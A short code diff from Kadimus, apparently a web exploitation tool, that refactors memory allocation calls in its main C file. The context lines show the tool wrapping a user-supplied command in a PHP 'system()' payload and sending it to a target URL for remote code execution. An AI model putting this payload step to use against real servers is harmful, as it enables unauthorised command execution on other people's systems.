@@ -9,7 +9,7 @@
 #include "kadimus.h"
 
 #include "kadimus_str.h"
-#include "kadimus_mem.h"
+#include "memory/alloc.h"
 #include "kadimus_request.h"
 #include "kadimus_xpl.h"
 #include "kadimus_regex.h"
@@ -404,7 +404,7 @@ int kadimus(struct kadimus_opts *opts){
 
 
     if(opts->cmd){
-        cmd = xmalloc(strlen(opts->cmd)+21);
+        xmalloc(cmd, strlen(opts->cmd)+21);
         sprintf(cmd, "<?php system(\"%s\"); ?>", opts->cmd);
         exec_phpcode(opts->url, opts->parameter, cmd, opts->technique);
         free(cmd);
